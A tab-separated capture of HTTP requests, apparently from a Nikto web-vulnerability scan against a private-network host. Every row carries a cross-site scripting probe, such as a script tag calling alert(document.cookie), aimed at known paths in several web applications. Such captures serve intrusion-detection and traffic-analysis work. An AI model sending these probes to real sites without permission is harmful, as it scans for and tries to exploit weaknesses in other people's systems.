http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																	Keep-Alive										192.168.1.101									1024						1	http://192.168.1.101/web/src/read_body.php?mailbox=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&startMessage=1&show_more=0		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003174)				/web/src/read_body.php?mailbox=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&passed_id=%3Cscript%3Ealert(Vulnerable)%3C%2Fscript%3E&startMessage=1&show_more=0
																	Keep-Alive										192.168.1.101									1025						1	http://192.168.1.101/web/acart2_0/deliver.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003185)				/web/acart2_0/deliver.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									1026						1	http://192.168.1.101/web/acart2_0/error.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003186)				/web/acart2_0/error.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									1027						1	http://192.168.1.101/web/acart2_0/admin/error.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003187)				/web/acart2_0/admin/error.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									1028						1	http://192.168.1.101/web/acart2_0/admin/index.asp?msg=<script>alert(\"test\")</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003188)				/web/acart2_0/admin/index.asp?msg=<script>alert(\"test\")</script>
																	Keep-Alive										192.168.1.101									1029						1	http://192.168.1.101/web/wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003226)				/web/wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1030						1	http://192.168.1.101/web/sysuser/docmgr/create.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003227)				/web/sysuser/docmgr/create.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1031						1	http://192.168.1.101/web/sysuser/docmgr/edit.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003228)				/web/sysuser/docmgr/edit.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1032						1	http://192.168.1.101/web/sysuser/docmgr/ftp.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003229)				/web/sysuser/docmgr/ftp.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1033						1	http://192.168.1.101/web/sysuser/docmgr/htaccess.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003230)				/web/sysuser/docmgr/htaccess.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1034						1	http://192.168.1.101/web/sysuser/docmgr/iecreate.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003231)				/web/sysuser/docmgr/iecreate.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1035						1	http://192.168.1.101/web/sysuser/docmgr/ieedit.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003232)				/web/sysuser/docmgr/ieedit.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1036						1	http://192.168.1.101/web/sysuser/docmgr/info.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003233)				/web/sysuser/docmgr/info.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1037						1	http://192.168.1.101/web/sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003234)				/web/sysuser/docmgr/mkdir.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1038						1	http://192.168.1.101/web/sysuser/docmgr/rename.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003235)				/web/sysuser/docmgr/rename.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1039						1	http://192.168.1.101/web/sysuser/docmgr/search.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003236)				/web/sysuser/docmgr/search.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1040						1	http://192.168.1.101/web/sysuser/docmgr/sendmail.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003237)				/web/sysuser/docmgr/sendmail.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1041						1	http://192.168.1.101/web/sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003238)				/web/sysuser/docmgr/template.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1042						1	http://192.168.1.101/web/sysuser/docmgr/update.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003239)				/web/sysuser/docmgr/update.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1043						1	http://192.168.1.101/web/sysuser/docmgr/vccheckin.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003240)				/web/sysuser/docmgr/vccheckin.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1044						1	http://192.168.1.101/web/sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003241)				/web/sysuser/docmgr/vccreate.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1045						1	http://192.168.1.101/web/sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003242)				/web/sysuser/docmgr/vchist.stm?path=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101															1	http://192.168.1.101/web/sysuser/docmgr/edit.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003243)				/web/sysuser/docmgr/edit.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1050						1	http://192.168.1.101/web/sysuser/docmgr/ieedit.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003244)				/web/sysuser/docmgr/ieedit.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1052						1	http://192.168.1.101/web/sysuser/docmgr/info.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003245)				/web/sysuser/docmgr/info.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1054						1	http://192.168.1.101/web/sysuser/docmgr/rename.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003246)				/web/sysuser/docmgr/rename.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1056						1	http://192.168.1.101/web/sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003247)				/web/sysuser/docmgr/sendmail.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1058						1	http://192.168.1.101/web/sysuser/docmgr/update.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003248)				/web/sysuser/docmgr/update.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1060						1	http://192.168.1.101/web/sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003249)				/web/sysuser/docmgr/vccheckin.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1062						1	http://192.168.1.101/web/sysuser/docmgr/vccreate.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003250)				/web/sysuser/docmgr/vccreate.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1064						1	http://192.168.1.101/web/sysuser/docmgr/vchist.stm?name=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003251)				/web/sysuser/docmgr/vchist.stm?name=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1065						1	http://192.168.1.101/web/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003254)				/web/syshelp/stmex.stm?foo=123&bar=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1066						1	http://192.168.1.101/web/syshelp/stmex.stm?foo=<script>alert(document.cookie)</script>&bar=456		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003255)				/web/syshelp/stmex.stm?foo=<script>alert(document.cookie)</script>&bar=456
																	Keep-Alive										192.168.1.101									1067						1	http://192.168.1.101/web/syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003256)				/web/syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1068						1	http://192.168.1.101/web/syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003257)				/web/syshelp/cscript/showfncs.stm?pkg=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1069						1	http://192.168.1.101/web/syshelp/cscript/showfnc.stm?pkg=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003258)				/web/syshelp/cscript/showfnc.stm?pkg=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1070						1	http://192.168.1.101/web/netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003259)				/web/netutils/ipdata.stm?ipaddr=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1071						1	http://192.168.1.101/web/netutils/findata.stm?host=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003260)				/web/netutils/findata.stm?host=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1072						1	http://192.168.1.101/web/netutils/findata.stm?user=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003261)				/web/netutils/findata.stm?user=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1073						1	http://192.168.1.101/web/sysuser/docmgr/search.stm?query=<script>alert(document.cookie)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003262)				/web/sysuser/docmgr/search.stm?query=<script>alert(document.cookie)</script>
																	Keep-Alive										192.168.1.101									1074						1	http://192.168.1.101/web/webtools/bonsai/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('Vulnerable')</script>&branch=HEAD		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003274)				/web/webtools/bonsai/cvsqueryform.cgi?cvsroot=/cvsroot&module=<script>alert('Vulnerable')</script>&branch=HEAD
																	Keep-Alive										192.168.1.101									1075						1	http://192.168.1.101/web/webtools/bonsai/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003276)				/web/webtools/bonsai/cvsquery.cgi?branch=<script>alert('Vulnerable')</script>&file=<script>alert(document.domain)</script>&date=<script>alert(document.domain)</script>
																	Keep-Alive										192.168.1.101									1076						1	http://192.168.1.101/web/webtools/bonsai/cvsquery.cgi?module=<script>alert('Vulnerable')</script>&branch=&dir=&file=&who=<script>alert(document.domain)</script>&sortby=Date&hours=2&date=week		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003277)				/web/webtools/bonsai/cvsquery.cgi?module=<script>alert('Vulnerable')</script>&branch=&dir=&file=&who=<script>alert(document.domain)</script>&sortby=Date&hours=2&date=week
																	Keep-Alive										192.168.1.101									1077						1	http://192.168.1.101/web/webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003280)				/web/webtools/bonsai/cvslog.cgi?file=*&rev=&root=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									1078						1	http://192.168.1.101/web/webtools/bonsai/cvslog.cgi?file=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003281)				/web/webtools/bonsai/cvslog.cgi?file=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									1079						1	http://192.168.1.101/web/webtools/bonsai/cvsblame.cgi?file=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003284)				/web/webtools/bonsai/cvsblame.cgi?file=<script>alert('Vulnerable')</script>
																	Keep-Alive										192.168.1.101									1080						1	http://192.168.1.101/web/webtools/bonsai/showcheckins.cgi?person=<script>alert('Vulnerable')</script>		GET				HTTP/1.1																			Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:003286)				/web/webtools/bonsai/showcheckins.cgi?person=<script>alert('Vulnerable')</script>
